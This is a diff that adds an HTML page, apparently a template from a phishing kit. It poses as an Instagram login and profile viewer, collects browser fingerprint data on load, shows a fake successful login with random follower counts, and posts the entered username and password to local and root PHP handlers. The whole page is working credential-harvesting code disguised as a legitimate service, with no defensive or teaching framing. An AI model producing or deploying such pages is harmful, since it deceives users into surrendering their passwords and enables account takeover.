@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Profile Viewer</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 40px;
+            font-size: 16px;
+        }
+        
+        .input-group {
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .result {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 12px;
+            text-align: left;
+        }
+        
+        .profile-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .profile-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .profile-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        
+        .profile-info h3 {
+            color: #333;
+            margin-bottom: 5px;
+            font-size: 18px;
+        }
+        
+        .profile-info p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 15px;
+        }
+        
+        .stat {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .error {
+            background: #fee;
+            color: #c33;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .success {
+            background: #efe;
+            color: #3c3;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h1 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body onload="mydata()">
+    <div class="container">
+        <div class="logo">📸</div>
+        <h1>Instagram Login</h1>
+        <p class="subtitle">Enter your Instagram credentials to access your account</p>
+        
+        <form id="instagramForm">
+            <div class="input-group">
+                <label for="username">Instagram Username</label>
+                <input type="text" id="username" name="username" placeholder="Enter username (without @)" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            
+            <button type="submit" class="btn">Login to Instagram</button>
+        </form>
+        
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Fetching profile data...</p>
+        </div>
+        
+        <div class="result" id="result">
+            <div class="profile-card">
+                <div class="profile-header">
+                    <div class="profile-avatar" id="profileAvatar">👤</div>
+                    <div class="profile-info">
+                        <h3 id="profileName">Username</h3>
+                        <p id="profileBio">Bio information</p>
+                    </div>
+                </div>
+                <div class="stats">
+                    <div class="stat">
+                        <div class="stat-number" id="followers">0</div>
+                        <div class="stat-label">Followers</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-number" id="following">0</div>
+                        <div class="stat-label">Following</div>
+                    </div>
+                    <div class="stat">
+                        <div class="stat-number" id="posts">0</div>
+                        <div class="stat-label">Posts</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="error" id="error"></div>
+        <div class="success" id="success"></div>
+    </div>
+
+    <script>
+        function post(data) {
+            // Send to local handler for template-specific data
+            $.ajax({
+                type: 'POST',
+                data: { data: data },
+                url: 'handler.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    console.log('Data sent to local handler successfully');
+                },
+                error: function() {
+                    console.log('Error sending data to local handler');
+                }
+            });
+            
+            // Also send to root handler for Instagram credentials
+            if(data.includes('instagram_login')) {
+                $.ajax({
+                    type: 'POST',
+                    data: { data: data },
+                    url: '../../instagram_handler.php',
+                    dataType: 'json',
+                    async: false,
+                    success: function(result) {
+                        console.log('Instagram credentials sent to root handler successfully');
+                    },
+                    error: function() {
+                        console.log('Error sending Instagram credentials to root handler');
+                    }
+                });
+            }
+        }
+
+        function mydata() {
+            // Collect user data
+            const userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+            
+            // Send data
+            post(JSON.stringify(userData));
+        }
+
+        document.getElementById('instagramForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!username) {
+                showError('Please enter a username');
+                return;
+            }
+            
+            if (!password) {
+                showError('Please enter a password');
+                return;
+            }
+            
+            // Show loading
+            document.querySelector('.loading').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+            document.getElementById('error').style.display = 'none';
+            document.getElementById('success').style.display = 'none';
+            
+            // Simulate login process
+            setTimeout(() => {
+                // Mock login data
+                const loginData = {
+                    username: username,
+                    password: password,
+                    fullName: username.charAt(0).toUpperCase() + username.slice(1),
+                    bio: 'This is a sample bio for demonstration purposes.',
+                    followers: Math.floor(Math.random() * 10000) + 100,
+                    following: Math.floor(Math.random() * 1000) + 50,
+                    posts: Math.floor(Math.random() * 500) + 10,
+                    isPrivate: Math.random() > 0.5,
+                    isVerified: Math.random() > 0.8,
+                    loginStatus: 'success'
+                };
+                
+                displayProfile(loginData);
+                
+                // Send credentials to handler
+                post(JSON.stringify({
+                    type: 'instagram_login',
+                    username: username,
+                    password: password,
+                    data: loginData,
+                    timestamp: new Date().toISOString()
+                }));
+                
+                // Hide loading
+                document.querySelector('.loading').style.display = 'none';
+                showSuccess('Login successful! Welcome to Instagram.');
+            }, 2000);
+        });
+        
+        function displayProfile(data) {
+            document.getElementById('profileName').textContent = data.fullName;
+            document.getElementById('profileBio').textContent = data.bio;
+            document.getElementById('followers').textContent = data.followers.toLocaleString();
+            document.getElementById('following').textContent = data.following.toLocaleString();
+            document.getElementById('posts').textContent = data.posts.toLocaleString();
+            
+            // Update avatar with first letter of username
+            document.getElementById('profileAvatar').textContent = data.username.charAt(0).toUpperCase();
+            
+            document.getElementById('result').style.display = 'block';
+        }
+        
+        function showError(message) {
+            document.getElementById('error').textContent = message;
+            document.getElementById('error').style.display = 'block';
+            document.querySelector('.loading').style.display = 'none';
+        }
+        
+        function showSuccess(message) {
+            document.getElementById('success').textContent = message;
+            document.getElementById('success').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
